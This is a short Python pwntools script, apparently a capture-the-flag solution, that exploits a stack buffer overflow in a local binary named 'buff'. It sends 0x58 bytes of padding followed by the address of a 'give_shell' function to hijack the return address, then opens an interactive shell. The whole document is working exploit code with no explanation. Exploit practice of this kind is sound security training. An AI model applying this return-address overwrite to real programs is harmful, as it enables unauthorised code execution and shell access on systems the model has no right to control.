#!/usr/bin/env python
from pwn import *

e = ELF("./buff").symbols
p = process("./buff")
give_shell = e["give_shell"]

print(hex(give_shell))
p.sendline("A" * (0x50+ 8) + p64(give_shell))
p.interactive()
